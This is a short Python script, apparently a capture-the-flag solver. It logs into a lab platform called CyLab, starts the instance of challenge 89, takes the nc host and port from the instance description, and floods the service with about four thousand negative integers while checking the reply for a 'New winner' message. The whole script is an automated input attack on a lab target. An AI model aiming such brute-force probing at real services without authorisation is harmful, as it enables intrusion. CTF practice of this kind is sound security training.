import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass
# toutes les valeurs negatives candidates, -815 en premier
vals = [-815] + [v for v in range(-1, -4095, -1) if v != -815]
payload = "".join(f"{v}\n" for v in vals)
s.sendall(payload.encode())
time.sleep(6)
out = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("recu:", len(txt), "octets")
print("New winner present:", "New winner" in txt)
print("Nope count:", txt.count("Nope"))
if "New winner" in txt:
    idx = txt.find("New winner")
    print("autour:", repr(txt[idx:idx + 300]))
else:
    print("fin:", repr(txt[-300:]))
s.close()
